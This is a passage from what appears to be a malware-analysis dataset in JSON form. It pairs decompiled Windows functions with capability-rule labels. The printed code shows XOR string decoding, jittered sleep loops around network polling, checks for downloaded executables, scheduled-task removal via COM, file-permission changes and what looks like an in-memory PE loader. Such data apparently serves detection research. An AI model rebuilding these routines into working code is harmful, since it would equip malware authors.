_sym.imp.KERNEL32.dll_HeapFree;\n    var_14h = 0;\n    var_ch = str.QT_Y___;\n    do {\n        var_8h = 0;\n        var_68h = 0;\n        iVar9 = 0;\n        var_64h = 1;\n        do {\n            if (var_ch[var_14h] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar8 = pcVar5;\n                while (cVar3 != var_ch[var_14h]) {\n                    if (cVar3 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040d196;\n                    }\n                    pcVar8 = pcVar8 + 1;\n                    cVar3 = *pcVar8;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x0040d196:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            stack0xffffffc8 = 0x3f161a78;\n            var_30h = 0x1b3e0145;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_2ch = 0x57186e12;\n            puVar10 = &var_24h;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_28h._0_2_ = 0x6833;\n            var_1ch = 0x5a666857;\n            var_18h._0_2_ = 0x7237;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_64h = &var_37h + (3 - iVar9);\n            do {\n                iVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                if (iVar7 != 0xe137fc) {\n                    *(iVar6 + iVar9) = *(&var_1ch + iVar6 % var_70h) ^ (iVar6 + iVar9)[var_64h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_74h);\n            iVar6 = fcn.0040314d(0, &ARG_0, &var_68h, &var_8h);\n            if (iVar6 == 0) {\n                if (var_68h == 0) {\n                    fcn.0040482b();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                    (*pcVar2)(uVar4);\n                    break;\n                }\n                if (var_24h < var_68h) {\n                    fcn.0040482b();\n                    var_6ch = var_6ch * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_6ch % 600000 + 60000);\n                }\n                else if (((4 < var_68h) && (var_68h == var_24h)) &&\n                        ((var_20h != NULL && ((*var_20h == 'M' && (var_20h[1] == 'Z')))))) {\n                    fcn.004047d4();\n                    fcn.0040482b();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                    (*pcVar2)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n            (*pcVar2)(uVar4);\n            pcVar5 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_14h = var_14h + 1;\n    } while (var_ch < 0x412140);\n    iVar9 = *var_60h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return iVar9 != 0;\n}\n",
        "token_count": 1836
    },
    "0040d38e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d408)\n// WARNING: Removing unreachable block (ram,0x0040d418)\n// WARNING: Removing unreachable block (ram,0x0040d425)\n// WARNING: Removing unreachable block (ram,0x0040d430)\n// WARNING: Removing unreachable block (ram,0x0040d43f)\n// WARNING: Removing unreachable block (ram,0x0040d449)\n// WARNING: Removing unreachable block (ram,0x0040d44b)\n// WARNING: Removing unreachable block (ram,0x0040d451)\n// WARNING: Removing unreachable block (ram,0x0040d467)\n\nuint __cdecl fcn.0040d38e(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x41cd20;\n    puVar4 = 0x41cd80;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040cf97();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x41caa0 == 0) {\n        if (*0x41cdd8 == 0) {\n            iVar2 = 0x32;\n        }\n        else {\n            iVar2 = fcn.0040d076();\n            if (iVar2 != 0) {\n                fcn.0040482b();\n            }\n            uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n            iVar2 = uVar3 % 600000 + 60000;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 441
    },
    "0040d4ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d4ca(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int16_t *var_ch;\n    int32_t pszFirst;\n    uint var_4h;\n    \n    var_30h = 0x333d3103;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x51136735;\n    var_28h = 0x3167591f;\n    pszFirst = 0x33513167;\n    var_4h._0_1_ = 0x59;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar6 != 0x8b3619) {\n            var_24h = 5;\n            *(iVar7 + piVar5) = *(&pszFirst + iVar7 % 5) ^ (iVar7 + piVar5)[&var_30h - piVar5];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar7) {\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x410380, 0, 1, 0x410370, &ppv);\n        if ((-1 < iVar7) && (ppv != NULL)) {\n            iVar7 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar7) && (var_20h != NULL)) {\n                iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar7 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar4 = *(var_1ch + var_10h * 4);\n                        var_24h = uVar4;\n                        iVar7 = (**(*ppv + 0x18))(ppv, uVar4, 0x410390, &var_18h);\n                        if ((-1 < iVar7) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_ch = NULL;\n                            iVar7 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar7) && (pszFirst != 0)) {\n                                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41cd94);\n                                if ((iVar7 != 0) &&\n                                   ((iVar7 = (**(*var_18h + 0x8c))(var_18h, &var_ch),  -1 < iVar7 && (var_ch != NULL))))\n                                {\n                                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_ch, piVar5);\n                                    piVar3 = var_ch;\n                                    if ((iVar7 != 0) &&\n                                       (((*var_ch == 0x22 && (var_ch[2] == 0x3a)) && (var_ch[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar9 = piVar5;\n                                        do {\n                                            iVar1 = *piVar9;\n                                            piVar9 = piVar9 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar3, piVar5);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_ch + 1, \n                                                   ((iVar7 - var_ch >> 1) - 2) + (piVar9 - (piVar5 + 1) >> 1));\n                                        iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar4 = var_24h;\n                                        if (iVar7 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar2)(var_ch);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar2)(uVar4);\n                    } while (var_10h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1431
    },
    "0040d768": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d768(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint psz2;\n    uint var_4h;\n    \n    psz2 = *0x41cd94;\n    if (*0x41cd8c != 0) {\n        return 1;\n    }\n    var_40h = 0x6a40650e;\n    var_3ch = 0x3321793f;\n    var_38h = 0x65154506;\n    var_34h = 0x79246a7d;\n    var_30h = 0x450f3308;\n    var_2ch = 0x6a5b652a;\n    var_28h = 0x33177924;\n    var_24h = 0x651d450f;\n    var_20h = 0x79206a60;\n    var_1ch = 0x451e3306;\n    var_18h = 0x6a5c6510;\n    var_14h = 0x3365792b;\n    var_10h = 0x6a336579;\n    var_ch._0_1_ = 0x45;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar4 != 0x56a72b) {\n            var_4h = 5;\n            *(iVar5 + iVar3) = *(&var_10h + iVar5 % 5) ^ (iVar5 + iVar3)[&var_40h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    *0x41cd8c = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cd8c != 0) {\n        if ((*0x41cd88 != 0) ||\n           (*0x41cd88 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41cd8c, 0xf001f, 0, 0, 0x208),  *0x41cd88 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41cd88, psz2);\n            uVar2 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41cd8c);\n        *0x41cd8c = 0;\n    }\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 828
    },
    "0040d8ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040d8ba(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "0040e545": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e545(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x0040e587;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x0040e587:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.0040e9ba();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 640
    },
    "0040ec73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ec73(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1550
    },
    "0040229e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040229e(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41caa0 = 1;\n    fcn.0040c5be(param_1);\n    fcn.0040d4ca();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41cd94);\n    if (iVar1 != -1) {\n        fcn.0040e0ae();\n    }\n    fcn.00401e16();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.00401d22();\n    return;\n}\n",
        "token_count": 141
    },
    "004077d7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004077d7(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.004086af();\n    if (iVar2 == 0) {\n        iVar2 = fcn.00401b2b(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.00401bb1(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41cda4 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.0040765b();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.0040765b();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 540
    },
    "0040b964": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040b964(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.0040314d(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.0040482b();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 398
    },
    "0040d9f1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d9f1(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.0040d97f();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x0040da93;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x0040da93;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0040da93:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 610
    },
    "0040dad5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
